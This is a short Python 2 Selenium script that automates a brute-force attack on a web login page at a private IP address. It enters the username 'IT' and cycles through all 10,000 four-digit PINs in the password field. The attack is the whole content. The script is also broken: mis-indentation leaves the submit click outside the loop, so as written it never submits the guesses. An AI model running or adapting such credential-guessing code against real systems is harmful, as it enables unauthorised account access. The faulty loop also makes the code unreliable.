#run_local.py
#by drh4kor
#inception date:2019-2-14

#get reference to the libraries
from selenium import webdriver
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary

#set variables
loginURL='http://10.10.1.20/'
binaryPath='/usr/bin/firefox'
#create object
binary = FirefoxBinary(binaryPath)
#create browser
driver = webdriver.Firefox(firefox_binary=binary)
driver.implicitly_wait(60)

#navigate to log in page
driver.get(loginURL)
#get the textbox to login
inputElement_id = driver.find_element_by_name('login_id')
#get the textbox for password
inputElement_psw = driver.find_element_by_name('login_pwd')
#set the path to the link element does not have id or name property.
inputElement_link=driver.find_element_by_xpath("/html/body/table/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr[4]/td/table/tbody/tr[2]/td[2]/table/tbody/tr[2]/td/table/tbody/tr[2]/td[2]/table/tbody/tr[5]/td[2]/table/tbody/tr/td/a")
inputElement_link=driver.find_element_by_xpath("//*[@id='btn_login']")
#setup counter variables
counter = 0
#setup initial value to test
psw_value=0000
#setup total number of tries
max_value = 10000
#show the current page path
print driver.current_url
currentURL=driver.current_url
#loop start at 0000
#simulate keys into the textbox
inputElement_id.send_keys('IT')

for x in range(0, max_value):
    #debug;show the counter
    print "Loop count %04d" % (x)
    #clear box
    inputElement_psw.clear()
    #todo: format x into '%3d'
    #simulate keys into the textbox
    psw_value=format(x,"04d")
    inputElement_psw.send_keys(psw_value)
    #simulate click on the faux button
inputElement_id = driver.find_element_by_name('login_id')
inputElement_psw = driver.find_element_by_name('login_pwd')
inputElement_link=driver.find_element_by_xpath("//*[@id='btn_login']")
inputElement_id.send_keys('IT')
inputElement_link.click()    
    #get the url from the page loaded
newURL = driver.current_url
print newURL;
#cleanup time
driver.close()
